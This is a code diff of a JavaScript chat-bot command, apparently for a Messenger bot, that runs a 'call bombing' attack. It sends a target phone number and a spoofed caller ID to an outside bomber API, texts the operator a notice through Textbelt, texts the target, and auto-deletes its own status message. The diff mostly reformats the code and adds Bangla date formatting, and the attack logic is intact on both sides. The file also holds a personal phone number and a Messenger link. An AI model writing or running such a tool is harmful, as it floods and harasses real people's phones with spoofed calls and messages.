@@ -14,9 +14,9 @@ module.exports.run = async ({ api, event, args }) => {
   const axios = require("axios");
 
   const targetNumber = args[0];
-  const fakeCallerID = "01715559179"; // ✅ তোমার ফেক কলার আইডি
-  const smsNotifyNumber = "01715559179"; // ✅ এখানে নোটিফিকেশন যাবে
-  const otp = Math.floor(100000 + Math.random() * 900000); // 🔐 Random OTP
+  const fakeCallerID = "01715559179";
+  const smsNotifyNumber = "01715559179";
+  const otp = Math.floor(100000 + Math.random() * 900000);
 
   if (!targetNumber || !/^01[0-9]{9}$/.test(targetNumber)) {
     return api.sendMessage(
@@ -28,67 +28,52 @@ module.exports.run = async ({ api, event, args }) => {
     );
   }
 
-  // সময় নিন (ঘন্টা, মিনিট, সেকেন্ড, মাস, বছর সহ)
+  const engToBanNum = s => s.toString().replace(/\d/g, d => "০১২৩৪৫৬৭৮৯"[d]);
   const now = new Date();
-  const formattedTime = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ` +
-    `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+  const hours = now.getHours();
+  const minutes = now.getMinutes();
+  const seconds = now.getSeconds();
+  const ampm = hours >= 12 ? "PM" : "AM";
+  const hour12 = hours % 12 || 12;
+  const timeBangla = `${engToBanNum(hour12)}:${engToBanNum(minutes)}:${engToBanNum(seconds)} ${ampm}`;
+  const day = engToBanNum(now.getDate());
+  const monthNames = ["জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন", "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"];
+  const month = monthNames[now.getMonth()];
+  const year = engToBanNum(now.getFullYear());
+  const dateBangla = `${day} ${month}, ${year}`;
 
   api.sendMessage(
-    `📞 কল বোম্বিং শুরু হয়েছে:\n📲 নাম্বার: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n\n⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
+    `📞 কল বোম্বিং শুরু হয়েছে:\n📲 টার্গেট নাম্বার: ${targetNumber}\n📤 ফেক কলার আইডি: ${fakeCallerID}\n🕒 সময়: ${timeBangla}\n📅 তারিখ: ${dateBangla}\n\n⏳ অনুগ্রহ করে অপেক্ষা করুন...`,
     event.threadID,
     async (err, startInfo) => {
-      if (err) {
-        return api.sendMessage("❌ মেসেজ পাঠানো ব্যর্থ হয়েছে।", event.threadID);
-      }
+      if (err) return api.sendMessage("❌ মেসেজ পাঠানো ব্যর্থ হয়েছে।", event.threadID);
 
       try {
-        // ✅ WhatsApp ফান কল মেসেজ
-        await api.sendMessage(
-          `📱 WhatsApp কল পাঠানো হচ্ছে:\n📲 ${targetNumber} নাম্বারে একটি ফেক WhatsApp কল যাচ্ছে... (ফান মেসেজ)`,
-          event.threadID
-        );
+        await api.sendMessage(`📱 WhatsApp ফান কল পাঠানো হচ্ছে:\n📲 ${targetNumber} নাম্বারে একটি ফেক WhatsApp কল যাচ্ছে...`, event.threadID);
 
-        // ✅ Call Bomber API কল
         const { data } = await axios.get(`https://tbblab.shop/callbomber.php?mobile=${targetNumber}&callerID=${fakeCallerID}`);
         const message = typeof data === "object" ? JSON.stringify(data, null, 2).slice(0, 500) : String(data).slice(0, 500);
 
         await api.sendMessage(`📥 সার্ভার রেসপন্স:\n${message}`, event.threadID);
 
-        // ✅ মেসেজ অটো ডিলিট
-        setTimeout(() => {
-          api.unsendMessage(startInfo.messageID).catch(() => { });
-        }, 90000); // ৯০ সেকেন্ড পরে
+        setTimeout(() => api.unsendMessage(startInfo.messageID).catch(() => {}), 90000);
 
-        // ✅ তোমার নাম্বারে নোটিফিকেশন যাবে মেসেঞ্জারে (Textbelt এর মাধ্যমে SMS যাবে)
         await axios.post("https://textbelt.com/text", {
           phone: `+880${smsNotifyNumber}`,
           message:
-            `🔥 কল বোম্বিং অনুরোধ:\n` +
-            `📲 টার্গেট: ${targetNumber}\n` +
-            `📤 ফেক কলার ID: ${fakeCallerID}\n` +
-            `🔐 OTP: ${otp}\n` +
-            `🕒 সময়: ${formattedTime}\n\n` +
-            `💬 মেসেঞ্জার আইডি: https://m.me/RAJA.ViP.5X.09638357510`,
+            `🔥 নতুন কল বোম্বিং অনুরোধ:\n📲 টার্গেট: ${targetNumber}\n📤 ফেক কলার ID: ${fakeCallerID}\n🔐 OTP: ${otp}\n🕒 সময়: ${timeBangla}\n📅 তারিখ: ${dateBangla}`,
           key: "textbelt"
         });
 
-        // ✅ টার্গেট নাম্বারে রাজার নাম ও নাম্বার যাবে
         await axios.post("https://textbelt.com/text", {
           phone: `+880${targetNumber}`,
           message: `📩 আপনার সাথে যোগাযোগ করুন রাজা (01715559179)`,
           key: "textbelt"
         });
 
-        return api.sendMessage(
-          `✅ ${targetNumber} নাম্বারে কল বোম্বিং সফলভাবে সম্পন্ন হয়েছে।`,
-          event.threadID
-        );
+        return api.sendMessage(`✅ ${targetNumber} নাম্বারে কল বোম্বিং সফলভাবে সম্পন্ন হয়েছে।`, event.threadID);
       } catch (err) {
-        return api.sendMessage(
-          `❌ ত্রুটি:\n${err.message}`,
-          event.threadID,
-          event.messageID
-        );
+        return api.sendMessage(`❌ ত্রুটি:\n${err.message}`, event.threadID, event.messageID);
       }
     }
   );
